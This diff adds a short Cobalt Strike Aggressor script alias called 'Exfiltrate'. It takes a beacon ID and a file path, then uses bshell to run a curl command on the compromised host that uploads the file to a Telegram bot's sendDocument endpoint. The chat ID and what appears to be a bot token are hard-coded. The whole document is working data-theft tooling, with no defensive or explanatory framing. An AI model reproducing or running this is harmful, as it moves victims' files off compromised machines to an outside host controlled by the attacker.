@@ -1,0 +1,7 @@
+alias Exfiltrate {
+    $bid = $1;
+    $input = $2;
+    $cmd = "curl -F chat_id=\"-1002022566569\" -F document=@\"".$input."\" https://api.telegram.org/bot6525507053:AAHBZ6khXBZGCQEnOaDRhK8-4UOqA7WKm1U/sendDocument";
+    println($cmd);
+    bshell($bid, $cmd);
+}
